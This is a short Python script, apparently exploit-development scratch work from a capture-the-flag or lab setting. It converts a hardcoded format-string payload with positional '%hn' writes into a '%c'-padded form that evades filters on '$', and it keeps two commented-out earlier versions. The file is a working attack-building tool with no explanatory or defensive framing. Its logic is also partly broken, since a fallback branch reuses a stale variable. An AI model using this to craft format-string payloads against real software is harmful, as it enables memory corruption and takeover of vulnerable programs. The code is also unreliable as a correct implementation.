p4 = b'AAA%10937c%37$hn%20593c%38$hn%958c%39$hn%32984c%40$hnaaaabaZ'
exploit_break = p4.split(b'$')
new_exploit = b''

for i in range(len(exploit_break) - 1):
    x = exploit_break[i]
    # print(x)
    y = x.split(b'%')
    # print("yyyyyyy",y)
    if len(y) > 2:
        y1 = y[0]
        y2 = y[1]
        y3 = y[2]

        if i == 0:
            new_exploit += y1
            offset = (int(y3.decode())-1)
            print("offset ", offset)
            new_exploit += ('%c'* (int(y3.decode())-1)).encode()
            z = y2[:-1]
            z1_bytes= b''
            z1 = (int(z.decode())) - (int(y3.decode())-1)
            z1_str = str(z1)
            z1_bytes += z1_str.encode()
            new_y = b"%"+z1_bytes+b'c'+b"%"
        else:
            new_y = y1+b"%"+y2+b"%"
        # print(new_y)
        # new_ex = x.replace(b'$', b'')
        # new_exploit += new_ex
        new_exploit += new_y
    else:
        new_exploit += b'%' + y1    

new_exploit += exploit_break[-1]
print("old exploit ")
print(p4)
print("new_exploit ")
print(new_exploit)





# # exploit_break = p4.split(b'$')
# # #print(exploit_break)
# # new_exploit = b''
# # for i in range(len(exploit_break) - 1):
# #   x = exploit_break[i]
# #   x_break = x.split(b'%')
# #   tmp = b'%'.join(x_break[:-1])
# #   tmp = tmp.replace(b'c', b'%c')
# #   new_exploit += tmp
# #   new_exploit += b'%c'*(int(x_break[-1]) - 2) + b'%'
# # new_exploit += exploit_break[-1]
# # print("new_exploit ")
# # print(new_exploit)

# exploit_break = p4.split(b'$')
# new_exploit = b''
# for i in range(len(exploit_break) - 1):
#     x = exploit_break[i]
#     new_ex = x.replace(b'$', b'')
#     new_exploit += new_ex

# new_exploit += exploit_break[-1]
# print("new_exploit ")
# print(new_exploit)